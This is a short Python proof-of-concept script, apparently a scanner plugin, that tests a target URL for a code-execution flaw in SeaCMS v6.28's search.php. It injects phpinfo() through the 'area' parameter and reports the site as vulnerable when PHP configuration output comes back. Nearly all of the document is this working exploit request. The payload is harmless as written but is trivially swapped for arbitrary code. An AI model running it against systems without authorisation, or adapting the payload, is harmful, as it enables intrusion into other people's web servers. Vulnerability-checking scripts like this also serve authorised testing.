#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: seacms v6.28 search.php 代码执行
referer: unknown
author: Lucifer
description: 文件search.php中,参数area存在代码执行。
'''
import sys
import requests
import warnings
def run(url):
        result = ['seacms v6.28 search.php 代码执行','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/search.php?searchtype=5&tid=&area=phpinfo()"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"Configuration File (php.ini) Path" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
